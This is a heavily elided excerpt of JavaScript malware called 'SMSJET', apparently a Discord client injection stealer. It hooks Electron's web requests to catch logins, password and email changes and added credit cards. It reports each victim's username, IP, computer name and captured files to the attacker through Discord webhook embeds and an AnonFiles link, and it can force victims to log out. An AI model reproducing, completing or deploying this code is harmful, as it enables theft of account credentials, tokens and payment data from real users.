...
const makeEmbed = async ({
    ...
    var params = {
        username: "SMS JET",
        avatar_url: "https://thumbs.dreamstime.com/t/vector-pixel-art-bomb-jet-isolated-cartoon-122274569.jpg",
        content: "",
        embeds: [{
            title: title,
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/SMSjet")){
        try{
        fs.rmdirSync(__dirname + "/SMSjet")
        }catch(err){
            console.log(err)
        }
    var ip = await getIP()
    ...
    if (!token) {
        var params = await makeEmbed({
            title: "<a:caat:1130448857436782682> SMSJET Initialized",
            fields: [{
                name: "Injection Info",
        ...
        if (!user.avatar) var userAvatar = "https://thumbs.dreamstime.com/t/vector-pixel-art-bomb-jet-isolated-cartoon-122274569.jpg"
        if (!user.banner) var userBanner = "https://thumbs.dreamstime.com/t/vector-pixel-art-bomb-jet-isolated-cartoon-122274569.jpg"
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Hurl3xMar0 <a:caat:1130448857436782682>](https://instagram.com/hurlexmaro`)`,
                inline: !0
            }, {
                name: "Catched Files",
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "<a:caat:1130448857436782682> SMSJET User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "<a:caat:1130448857436782682> SMSJET Victim got logged out",
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "<a:caat:1130448857436782682> SMSJET User Login",
                color: config['embed-color'],
                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                fields: [{
                    name: "Username <a:inject:1130448568268881960>",
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "<a:caat:1130448857436782682>  SMSJET Detect Password Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <a:inject:1130448568268881960>",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "<a:caat:1130448857436782682> SMSJET Detect Email Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <a:inject:1130448568268881960>",
            ...
            case request.url.endsWith("tokens"):
                ...
                var params = await makeEmbed({
                    title: "<a:caat:1130448857436782682> SMSJET User Credit Card Added",
                    color: config['embed-color'],
                    fields: [
                      { name: "Catched Files", value: `[AnonFiles <:anonfiles:1130451891139133480>](${config.transfer_link})` },
                      { name: "IP", value: ip },
